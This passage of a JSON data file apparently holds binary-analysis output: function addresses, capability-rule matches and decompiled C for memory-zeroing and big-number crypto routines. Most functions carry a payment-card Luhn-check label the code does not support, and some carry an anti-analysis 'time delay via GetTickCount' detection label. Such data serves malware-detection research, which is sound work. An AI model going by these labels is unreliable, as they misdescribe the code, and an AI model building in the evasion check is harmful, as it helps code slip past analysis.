        "decompiled_code": "\nvoid __cdecl fcn.004086c0(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00408a60(arg_8h + 0x20);\n        fcn.0040eda0(arg_8h, 0x140);\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "004086f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004086f0(uint arg_8h)\n\n{\n    fcn.004124f0(arg_8h, 0, 0x140);\n    return;\n}\n",
        "token_count": 43
    },
    "00408800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_180h\n\nint32_t __cdecl fcn.00408800(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint var_180h;\n    uint in_stack_fffffe80;\n    uint in_stack_fffffe84;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    \n    uVar1 = *(arg_8h + 0x18);\n    if ((uVar1 < 0x181) && (arg_10h <= 0x180 - uVar1)) {\n        fcn.004124f0(&var_180h, 0, 0x180);\n        iVar2 = (**(arg_8h + 0x138))(*(arg_8h + 0x13c), &var_180h, uVar1);\n        if (iVar2 != 0) {\n            return -0x34;\n        }\n        iVar2 = *(arg_8h + 0x18);\n        if ((arg_ch != 0) && (arg_10h != 0)) {\n            fcn.004124d0(&var_180h + iVar2, arg_ch, arg_10h);\n            iVar2 = iVar2 + arg_10h;\n        }\n        iVar2 = fcn.00408400(&var_180h, &var_180h, iVar2, unaff_EDI, unaff_ESI, unaff_EBX, var_180h, in_stack_fffffe80, \n                             in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, in_stack_fffffe90, \n                             in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, \n                             in_stack_fffffea4, in_stack_fffffea8, in_stack_fffffeac, in_stack_fffffeb0, \n                             in_stack_fffffeb4, in_stack_fffffeb8, in_stack_fffffebc, in_stack_fffffec0, \n                             in_stack_fffffec4, in_stack_fffffec8, in_stack_fffffecc, in_stack_fffffed0, \n                             in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc);\n        if (iVar2 == 0) {\n            iVar2 = fcn.004085f0(arg_8h, &var_180h);\n            if (iVar2 == 0) {\n                *(arg_8h + 0x10) = 1;\n            }\n        }\n        fcn.0040eda0(&var_180h, 0x180);\n        return iVar2;\n    }\n    return -0x38;\n}\n",
        "token_count": 834
    },
    "004088f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004088f0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    \n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    fcn.00408a80(arg_8h + 0x20);\n    *(arg_8h + 0x138) = arg_ch;\n    *(arg_8h + 0x13c) = arg_10h;\n    *(arg_8h + 0x18) = 0x20;\n    *(arg_8h + 0x1c) = 10000;\n    iVar1 = fcn.00408aa0(arg_8h + 0x20, &var_20h, 0x100);\n    if (iVar1 == 0) {\n        fcn.00408800(arg_8h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00408a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a60(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0040eda0(arg_8h, 0x118);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00408a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a80(uint arg_8h)\n\n{\n    fcn.004124f0(arg_8h, 0, 0x118);\n    return;\n}\n",
        "token_count": 43
    },
    "00409c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c90(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.00409cd0(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 161
    },
    "00409cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409cd0(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 0) {\n        iVar2 = fcn.00409da0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040c440(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.0040c440(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.00409ac0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 258
    },
    "00409e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e40(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_ch >> 0x1f;\n    arg_ch = (arg_ch ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_ch;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.00409e80(arg_8h, &var_ch);\n    return;\n}\n",
        "token_count": 144
    },
    "0040add0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040add0(uint *arg_8h)\n\n{\n    if (arg_8h != NULL) {\n        if (arg_8h[2] != 0) {\n            fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0040b470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b470(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    \n    if (10000 < arg_ch) {\n        return 0xfffffff0;\n    }\n    if (*(arg_8h + 4) < arg_ch) {\n        arg_8h_00 = sub.msvcrt.dll_calloc(arg_ch, 4);\n        if (arg_8h_00 == 0) {\n            return 0xfffffff0;\n        }\n        if (*(arg_8h + 8) != 0) {\n            fcn.004124d0(arg_8h_00, *(arg_8h + 8), *(arg_8h + 4) << 2);\n            fcn.0040eda0(*(arg_8h + 8), *(arg_8h + 4) << 2);\n            sub.msvcrt.dll_free(*(arg_8h + 8));\n        }\n        *(arg_8h + 4) = arg_ch;\n        *(arg_8h + 8) = arg_8h_00;\n    }\n    return 0;\n}\n",
        "token_count": 260
    },
    "0040bd30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bd30(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 0;\n    var_10h = 1;\n    var_ch = 1;\n    iVar1 = fcn.00409e80(arg_10h, &var_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    iVar1 = fcn.0040a040(0, arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        var_8h = &var_4h;\n        var_10h = 1;\n        var_ch = 1;\n        var_4h = iVar1;\n        iVar2 = fcn.00409e80(arg_8h, &var_10h);\n        while (iVar2 < 0) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 0) {\n                iVar1 = fcn.00409da0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.0040c440(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x0040be08;\n                }\n                iVar1 = fcn.0040c440(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                var_4h = -var_4h;\n            }\n            else {\n                iVar1 = fcn.00409ac0(arg_8h, arg_8h, arg_10h);\ncode_r0x0040be08:\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            *arg_8h = var_4h;\n            var_8h = &var_4h;\n            var_4h = 0;\n            var_10h = 1;\n            var_ch = 1;\n            iVar2 = fcn.00409e80(arg_8h, &var_10h);\n        }\n        iVar2 = fcn.00409e80(arg_8h, arg_10h);\n        while (-1 < iVar2) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 1) {\n                iVar1 = fcn.00409ac0(arg_8h, arg_8h, arg_10h);\ncode_r0x0040be9c:\n                iVar2 = var_4h;\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            else {\n                iVar1 = fcn.00409da0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.0040c440(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x0040be9c;\n                }\n                iVar1 = fcn.0040c440(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                iVar2 = -var_4h;\n            }\n            *arg_8h = iVar2;\n            iVar2 = fcn.00409e80(arg_8h, arg_10h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 839
    },
    "0040bed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bed0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_10h = 1;\n    var_4h = arg_10h;\n    var_ch = 1;\n    fcn.0040bf10(arg_8h, arg_ch, &var_10h);\n    return;\n}\n",
        "token_count": 121
    },
    "0040c510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c510(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.0040c550(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 161
    },
    "0040c550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c550(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 1) {\n        iVar2 = fcn.00409ac0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.00409da0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040c440(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.0040c440(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 258
    },
    "0040cc70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cc70(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_01;\n    int32_t *arg_10h_00;\n    int32_t *arg_ch_00;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(arg_18h + 4) < *(arg_10h + 4) + 1U) || (*(arg_18h + 8) == 0)) {\n        return 0xfffffffc;\n    }\n    fcn.004124f0(*(arg_18h + 8), 0, *(arg_18h + 4) * 4);\n    arg_8h_00 = *(arg_10h + 4);\n    arg_ch_00 = *(arg_18h + 8);\n    arg_8h_01 = *(arg_ch + 4);\n    if (arg_8h_00 <= *(arg_ch + 4)) {\n        arg_8h_01 = arg_8h_00;\n    }\n    var_4h = 0;\n    arg_10h_00 = arg_ch_00;\n    if (arg_8h_00 != 0) {\n        do {\n            iVar3 = *(*(arg_8h + 8) + var_4h * 4);\n            iVar1 = **(arg_ch + 8);\n            iVar2 = *arg_10h_00;\n            fcn.0040cdd0(arg_8h_01, *(arg_ch + 8), arg_10h_00, iVar3);\n            fcn.0040cdd0(arg_8h_00, *(arg_10h + 8), arg_10h_00, (iVar1 * iVar3 + iVar2) * arg_14h);\n            var_4h = var_4h + 1;\n            *arg_10h_00 = iVar3;\n            arg_ch_00 = arg_10h_00 + 1;\n            arg_10h_00[arg_8h_00 + 2] = 0;\n            arg_10h_00 = arg_ch_00;\n        } while (var_4h < arg_8h_00);\n    }\n    fcn.004124d0(*(arg_8h + 8), arg_ch_00, arg_8h_00 * 4 + 4);\n    iVar3 = fcn.00409da0(arg_8h, arg_10h);\n    if (iVar3 < 0) {\n        fcn.0040d040(arg_8h_00, *(arg_8h + 8), *(arg_18h + 8));\n        return 0;\n    }\n    fcn.0040d040(arg_8h_00, *(arg_10h + 8), *(arg_8h + 8));\n    return 0;\n}\n",
        "token_count": 709
    },
    "0040cd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cd90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 1;\n    var_10h = 1;\n    var_ch = 1;\n    fcn.0040cc70(arg_8h, &var_10h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 135
    },
    "0040d040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d040(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar3 = 0;\n    if (arg_8h != 0) {\n        arg_ch = arg_ch - arg_10h;\n        do {\n            uVar1 = *arg_10h;\n            uVar4 = uVar1 - uVar3;\n            *arg_10h = uVar4;\n            uVar2 = *(arg_ch + arg_10h);\n            *arg_10h = uVar4 - uVar2;\n            uVar3 = (uVar1 < uVar3) + (uVar4 < uVar2);\n            arg_10h = arg_10h + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n        if (uVar3 != 0) {\n            do {\n                uVar1 = *arg_10h;\n                *arg_10h = uVar1 - uVar3;\n                bVar5 = uVar1 < uVar3;\n                uVar3 = uVar1 < uVar3;\n                arg_10h = arg_10h + 1;\n            } while (bVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "0040d0b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d0b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d130(arg_8h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040df30(arg_8h, 1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040f020(arg_8h + 8, arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x14, 0, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0040ee70(arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                     arg_8h + 0x5c);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 268
    },
    "0040d2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d2d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409e40(arg_8h + 8, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00409e40(arg_8h + 0x2c, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00409e40(arg_8h + 0x38, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.00409e40(arg_8h + 0x20, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00409e40(arg_8h + 0x14, 0);\n        if (iVar1 == 0) {\n            return -0x4080;\n        }\n        if ((((arg_ch == 0) || (iVar1 = fcn.00409f60(arg_ch, arg_8h + 0x44),  iVar1 == 0)) &&\n            ((arg_10h == 0 || (iVar1 = fcn.00409f60(arg_10h, arg_8h + 0x50),  iVar1 == 0)))) &&\n           ((arg_14h == 0 || (iVar1 = fcn.00409f60(arg_14h, arg_8h + 0x5c),  iVar1 == 0)))) {\n            return 0;\n        }\n        return iVar1 + -0x4080;\n    }\n    return -0x4080;\n}\n",
        "token_count": 423
    },
    "0040d3a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3a0(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t arg_8h_00;\n    \n    if (arg_8h != 0) {\n        fcn.0040add0(arg_8h + 0x8c);\n        fcn.0040add0(arg_8h + 0x98);\n        fcn.0040add0(arg_8h + 0x68);\n        fcn.0040add0(arg_8h + 0x20);\n        fcn.0040add0(arg_8h + 0x38);\n        fcn.0040add0(arg_8h + 0x2c);\n        fcn.0040add0(arg_8h + 0x14);\n        fcn.0040add0(arg_8h + 8);\n        fcn.0040add0(arg_8h + 0x80);\n        fcn.0040add0(arg_8h + 0x74);\n        fcn.0040add0(arg_8h + 0x5c);\n        fcn.0040add0(arg_8h + 0x50);\n        if (arg_8h + 0x44 != NULL) {\n            arg_8h_00 = *(arg_8h + 0x4c);\n            if (arg_8h_00 != 0) {\n                arg_ch = *(arg_8h + 0x48) << 2;\n                fcn.0040eda0(arg_8h_00, arg_ch);\n                sub.msvcrt.dll_free(*(arg_8h + 0x4c), arg_8h_00, arg_ch, unaff_ESI, unaff_EBP);\n            }\n            *(arg_8h + 0x44) = 1;\n            *(arg_8h + 0x48) = 0;\n            *(arg_8h + 0x4c) = 0;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0040d720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040d720(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch != 0) {\n        iVar1 = fcn.00409f60(arg_8h + 8, arg_ch);\n        if (iVar1 != 0) goto code_r0x0040d7a0;\n    }\n    if (arg_10h != 0) {\n        iVar1 = fcn.00409f60(arg_8h + 0x2c, arg_10h);\n        if (iVar1 != 0) goto code_r0x0040d7a0;\n    }\n    if (arg_14h != 0) {\n        iVar1 = fcn.00409f60(arg_8h + 0x38, arg_14h);\n        if (iVar1 != 0) goto code_r0x0040d7a0;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.00409f60(arg_8h + 0x20, arg_18h);\n        if (iVar1 != 0) goto code_r0x0040d7a0;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.00409f60(arg_8h + 0x14, arg_1ch);\n        if (iVar1 != 0) {\ncode_r0x0040d7a0:\n            return iVar1 + -0x4080;\n        }\n    }\n    if (arg_ch != 0) {\n        uVar2 = fcn.0040c420(arg_8h + 8);\n        *(arg_8h + 4) = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 440
    },
    "0040d7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d7d0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004124f0(arg_8h, 0, 0xa4);\n    *(arg_8h + 0xa4) = arg_ch;\n    *(arg_8h + 0xa8) = arg_10h;\n    return;\n}\n",
        "token_count": 91
    },
    "0040de20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040de20(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    uint arg_10h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    \n    uVar1 = *(arg_8h + 4);\n    arg_8h_00 = arg_8h + 8;\n    uVar2 = fcn.0040c420(arg_8h_00);\n    if ((uVar1 == uVar2) && (uVar1 < 0x401)) {\n        iVar3 = fcn.00409e40(arg_8h_00, 0);\n        if (0 < iVar3) {\n            iVar3 = fcn.0040b440(arg_8h_00, 0);\n            if (iVar3 != 0) {\n                iVar3 = fcn.00409e40(arg_8h + 0x14, 0);\n                if (0 < iVar3) {\n                    fcn.0040b4e0(&var_ch);\n                    iVar3 = fcn.0040c0e0(&var_ch, arg_ch, *(arg_8h + 4));\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.00409e80(&var_ch, arg_8h_00);\n                        if (iVar3 < 0) {\n                            arg_10h_00 = *(arg_8h + 4);\n                            iVar3 = fcn.0040a5e0(&var_ch, &var_ch, arg_8h + 0x14, arg_8h_00, arg_8h + 0x68);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.0040c5f0(&var_ch, arg_10h, arg_10h_00);\n                            }\n                        }\n                        else {\n                            iVar3 = -4;\n                        }\n                    }\n                    fcn.0040add0(&var_ch);\n                    if (iVar3 != 0) {\n                        return iVar3 + -0x4280;\n                    }\n                    return 0;\n                }\n            }\n        }\n    }\n    return -0x4080;\n}\n",
        "token_count": 511
    },
    "0040df30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040df30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar2 = fcn.0040c420(iVar4);\n    if ((((uVar1 == uVar2) && (uVar1 < 0x401)) && (iVar3 = fcn.00409e40(iVar4, 0),  0 < iVar3)) &&\n       (iVar4 = fcn.0040b440(iVar4, 0),  iVar4 != 0)) {\n        if (arg_ch != 0) {\n            iVar4 = fcn.00409e40(arg_8h + 0x2c, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.0040b440(arg_8h + 0x2c, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.00409e40(arg_8h + 0x38, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.0040b440(arg_8h + 0x38, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n        }\n        iVar4 = fcn.00409e40(arg_8h + 0x14, 0);\n        if (0 < iVar4) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n            iVar4 = fcn.00409e40(arg_8h + 0x44, 0);\n            if (((0 < iVar4) && (iVar4 = fcn.00409e40(arg_8h + 0x50, 0),  0 < iVar4)) &&\n               (iVar4 = fcn.00409e40(arg_8h + 0x5c, 0),  0 < iVar4)) {\n                return 0;\n            }\n        }\n    }\n    return 0xffffbf80;\n}\n",
        "token_count": 534
    },
    "0040eb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eb40(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0040eda0(arg_8h, 0x6c);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0040eb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eb60(uint arg_8h)\n\n{\n    fcn.004124f0(arg_8h, 0, 0x6c);\n    return;\n}\n",
        "token_count": 44
    },
    "0040eb80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040eb80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_6ch;\n    \n    fcn.004124f0(&var_6ch, 0, 0x6c);\n    iVar1 = fcn.0040ebf0(&var_6ch, arg_14h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040ecc0(&var_6ch, arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040e980(&var_6ch, arg_10h);\n        }\n    }\n    fcn.0040eda0(&var_6ch, 0x6c);\n    return iVar1;\n}\n",
        "token_count": 194
    },
    "0040eda0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eda0(uint arg_8h, uint arg_ch)\n\n{\n    (**0x41d920)(arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "0040edc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040edc0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    fcn.0040b4e0(&var_ch);\n    if (arg_14h != 0) {\n        iVar1 = fcn.0040c510(&var_ch, arg_8h, 1);\n        if (iVar1 != 0) goto code_r0x0040ee56;\n        iVar1 = fcn.0040bd30(arg_14h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x0040ee56;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.0040c510(&var_ch, arg_ch, 1);\n        if (iVar1 != 0) goto code_r0x0040ee56;\n        iVar1 = fcn.0040bd30(arg_18h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x0040ee56;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.0040b500(arg_1ch, arg_ch, arg_8h);\n    }\ncode_r0x0040ee56:\n    fcn.0040add0(&var_ch);\n    return iVar1;\n}\n",
        "token_count": 352
